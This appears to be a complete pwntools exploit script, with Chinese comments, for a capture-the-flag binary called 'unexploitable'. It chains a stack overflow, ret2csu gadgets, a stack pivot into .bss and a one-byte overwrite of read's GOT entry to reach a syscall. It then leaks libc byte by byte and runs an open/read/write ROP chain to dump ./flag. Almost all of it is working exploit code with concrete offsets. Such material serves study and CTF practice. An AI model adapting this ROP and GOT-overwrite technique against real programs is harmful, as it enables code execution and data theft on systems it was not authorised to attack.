#coding=utf-8
from pwn import*
import time
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

elf = ELF('./unexploitable')
p = process('./unexploitable')
libc = ELF('./libc-2.27.so')

def pr(a,addr):
	log.success(a+': '+hex(addr))

csu_init_gadget1 = 0x400780
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    qword ptr [r12+rbx*8]
'''
csu_init_gadget2 = 0x40079a
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
def csu_rop(rbx, rbp, call, rdi, rsi, rdx, ret):
	rop  = p64(rbx)
	rop += p64(rbp)
	rop += p64(call)
	rop += p64(rdi)
	rop += p64(rsi)
	rop += p64(rdx)
	rop += p64(ret)
	return rop

libc_start_main = elf.got["__libc_start_main"]
read_got = elf.got["read"] #0x601030
leave_ret = 0x40070A
extern_read = 0x601070
pop_rbp_ret = 0x400689

payload  = 'A'*0x10 + p64(0xdeadbeef)
payload += p64(csu_init_gadget2)
payload += csu_rop(0,1,read_got,0,extern_read,0x300,csu_init_gadget1)
payload += "\x00"*0x38 #pad
payload += p64(pop_rbp_ret) #set rbp
payload += p64(extern_read-0x8)
payload += p64(leave_ret) #migrate 栈迁移

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload)

context_addr = extern_read + 0x278 #0x6012e8

payload2  = p64(csu_init_gadget2)
payload2 += csu_rop(0,1,read_got,0,read_got,0x1,csu_init_gadget1) #modify LSB of read_got

for i in range(6):
	payload2 += p64(0) #padding<-rsp, 之后执行 csu_init_gadget2，系统调用 write
	payload2 += csu_rop(0,1,read_got,1,libc_start_main+i,0x1,csu_init_gadget1)

payload2 += p64(0) 
payload2 += csu_rop(0,1,read_got,1,libc_start_main,0x0,csu_init_gadget1) #make rax=0

payload2 += p64(0) #padding<-rsp
payload2 += csu_rop(0,1,read_got,0,context_addr,0x200,csu_init_gadget1) #输入payload3到context_addr
payload2 += "A"*0x38 #pad,之后接 orw_rop<-context_addr

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload2)

#gdb.attach(p)
#pause()
time.sleep(1)
p.send('\x2f') #read_plt 低字节修改为 syscal 的低字节 0x90|0x2f

libcbase = u64(p.recv(6).ljust(8, "\x00")) - libc.symbols["__libc_start_main"]
pr("libcbase",libcbase)

bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2625 # syscall ; ret
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret

def orw_rop(rdi,rsi,rdx,rax):
	orw  = p64(prdi_ret) + p64(rdi)
	orw += p64(prsi_ret) + p64(rsi)
	orw += p64(prdx_ret) + p64(rdx) + p64(0)
	orw += p64(prax_ret) + p64(rax)
	orw += p64(syscall_ret)
	return orw

payload3  = orw_rop(context_addr+0x100,0,0,2) #open
payload3 += orw_rop(3,bss_addr,0x30,0) #read
payload3 += orw_rop(1,bss_addr,0x30,1) #wirte
payload3  = payload3.ljust(0x100,'\x00') + './flag\x00\x00'

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload3)

p.interactive()

#先用通用 gadget 调用 read 将 read_plt 低字节修改为 syscal
#因为写入的是一字节，所以rax=1，也就是 SYS_write 的系统调用号
#这时 read_plt 就等于 syscall，再执行 read_plt，就相当于执行系统调用 SYS_write

#得到 write 之后需要泄露 __libc_start_main 的 got 表值来计算 libc 基址。
#注意一个一个字节泄露执行 6 次，一次泄露多个字节会导致 rax 过大，
#每次 write 一个字节可以保证 rax 始终为 1
#然后执行 write(1, addr, 0) 输出 0 个字节，RAX=0，也就是 SYS_read 的系统调用号
#回到 read 输入 orw_rop 即可